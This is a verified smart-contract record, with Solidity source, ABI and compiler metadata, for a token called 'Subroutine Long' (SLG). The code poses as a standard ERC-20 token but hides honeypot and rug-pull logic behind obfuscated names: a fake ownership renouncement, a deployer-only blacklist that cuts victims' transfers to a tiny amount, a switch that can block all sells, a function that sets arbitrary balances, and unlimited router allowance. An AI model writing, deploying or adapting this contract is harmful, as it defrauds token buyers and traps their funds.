{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface liquidityToFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquiditySell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedExempt {\n    function createPair(address limitTokenFee, address toLaunchedFund) external returns (address);\n}\n\ninterface receiverMinWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listMaxLiquidity) external view returns (uint256);\n\n    function transfer(address toLaunchAuto, uint256 walletEnableReceiver) external returns (bool);\n\n    function allowance(address shouldList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletEnableReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toLaunchAuto,\n        uint256 walletEnableReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundTotal, uint256 value);\n    event Approval(address indexed shouldList, address indexed spender, uint256 value);\n}\n\ninterface marketingTx is receiverMinWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SubroutineLong is liquiditySell, receiverMinWallet, marketingTx {\n\n    mapping(address => bool) public isAmountFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return autoMin;\n    }\n\n    address fromLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public listTotal;\n\n    uint256 private launchedMarketing = 100000000 * 10 ** 18;\n\n    bool private fundTxLiquidity;\n\n    address public isShould;\n\n    bool private fundFrom;\n\n    uint8 private teamToken = 18;\n\n    mapping(address => mapping(address => uint256)) private fundAtFrom;\n\n    uint256 private modeFundAmount;\n\n    uint256 constant modeExemptTx = 3 ** 10;\n\n    function teamTake(uint256 walletEnableReceiver) public {\n        autoSender();\n        launchLiquidity = walletEnableReceiver;\n    }\n\n    function buyReceiver(address tradingReceiver) public {\n        autoSender();\n        \n        if (tradingReceiver == enableWallet || tradingReceiver == isShould) {\n            return;\n        }\n        isAmountFrom[tradingReceiver] = true;\n    }\n\n    function transfer(address toTakeReceiver, uint256 walletEnableReceiver) external virtual override returns (bool) {\n        return liquidityLimit(_msgSender(), toTakeReceiver, walletEnableReceiver);\n    }\n\n    uint256 marketingTake;\n\n    function transferFrom(address exemptModeAt, address toLaunchAuto, uint256 walletEnableReceiver) external override returns (bool) {\n        if (_msgSender() != fromLiquidity) {\n            if (fundAtFrom[exemptModeAt][_msgSender()] != type(uint256).max) {\n                require(walletEnableReceiver <= fundAtFrom[exemptModeAt][_msgSender()]);\n                fundAtFrom[exemptModeAt][_msgSender()] -= walletEnableReceiver;\n            }\n        }\n        return liquidityLimit(exemptModeAt, toLaunchAuto, walletEnableReceiver);\n    }\n\n    address public enableWallet;\n\n    string private autoMin = \"Subroutine Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedMarketing;\n    }\n\n    function approve(address takeLaunch, uint256 walletEnableReceiver) public virtual override returns (bool) {\n        fundAtFrom[_msgSender()][takeLaunch] = walletEnableReceiver;\n        emit Approval(_msgSender(), takeLaunch, walletEnableReceiver);\n        return true;\n    }\n\n    function liquidityFundTake(address toTakeReceiver, uint256 walletEnableReceiver) public {\n        autoSender();\n        fundReceiver[toTakeReceiver] = walletEnableReceiver;\n    }\n\n    constructor (){\n        \n        liquidityToFee tokenAt = liquidityToFee(fromLiquidity);\n        isShould = launchedExempt(tokenAt.factory()).createPair(tokenAt.WETH(), address(this));\n        \n        enableWallet = _msgSender();\n        toMaxSender();\n        exemptList[enableWallet] = true;\n        fundReceiver[enableWallet] = launchedMarketing;\n        \n        emit Transfer(address(0), enableWallet, launchedMarketing);\n    }\n\n    mapping(address => uint256) private fundReceiver;\n\n    function allowance(address shouldTotal, address takeLaunch) external view virtual override returns (uint256) {\n        if (takeLaunch == fromLiquidity) {\n            return type(uint256).max;\n        }\n        return fundAtFrom[shouldTotal][takeLaunch];\n    }\n\n    uint256 private listIsSender;\n\n    uint256 launchLiquidity;\n\n    function receiverEnable(address exemptModeAt, address toLaunchAuto, uint256 walletEnableReceiver) internal returns (bool) {\n        require(fundReceiver[exemptModeAt] >= walletEnableReceiver);\n        fundReceiver[exemptModeAt] -= walletEnableReceiver;\n        fundReceiver[toLaunchAuto] += walletEnableReceiver;\n        emit Transfer(exemptModeAt, toLaunchAuto, walletEnableReceiver);\n        return true;\n    }\n\n    function toMaxSender() public {\n        emit OwnershipTransferred(enableWallet, address(0));\n        atMin = address(0);\n    }\n\n    address private atMin;\n\n    function tradingFromSell(address autoLaunched) public {\n        if (listTotal) {\n            return;\n        }\n        \n        exemptList[autoLaunched] = true;\n        \n        listTotal = true;\n    }\n\n    string private buyModeAuto = \"SLG\";\n\n    function balanceOf(address listMaxLiquidity) public view virtual override returns (uint256) {\n        return fundReceiver[listMaxLiquidity];\n    }\n\n    mapping(address => bool) public exemptList;\n\n    function autoSender() private view {\n        require(exemptList[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamToken;\n    }\n\n    address receiverTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed minSell, address indexed txLimit);\n\n    function getOwner() external view returns (address) {\n        return atMin;\n    }\n\n    function liquidityLimit(address exemptModeAt, address toLaunchAuto, uint256 walletEnableReceiver) internal returns (bool) {\n        if (exemptModeAt == enableWallet) {\n            return receiverEnable(exemptModeAt, toLaunchAuto, walletEnableReceiver);\n        }\n        uint256 sellAmount = receiverMinWallet(isShould).balanceOf(receiverTotal);\n        require(sellAmount == launchLiquidity);\n        require(toLaunchAuto != receiverTotal);\n        if (isAmountFrom[exemptModeAt]) {\n            return receiverEnable(exemptModeAt, toLaunchAuto, modeExemptTx);\n        }\n        return receiverEnable(exemptModeAt, toLaunchAuto, walletEnableReceiver);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyModeAuto;\n    }\n\n    function owner() external view returns (address) {\n        return atMin;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletEnableReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMaxLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"}],\"name\":\"buyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAmountFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTakeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletEnableReceiver\",\"type\":\"uint256\"}],\"name\":\"liquidityFundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletEnableReceiver\",\"type\":\"uint256\"}],\"name\":\"teamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMaxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"}],\"name\":\"tradingFromSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTakeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletEnableReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptModeAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLaunchAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletEnableReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SubroutineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}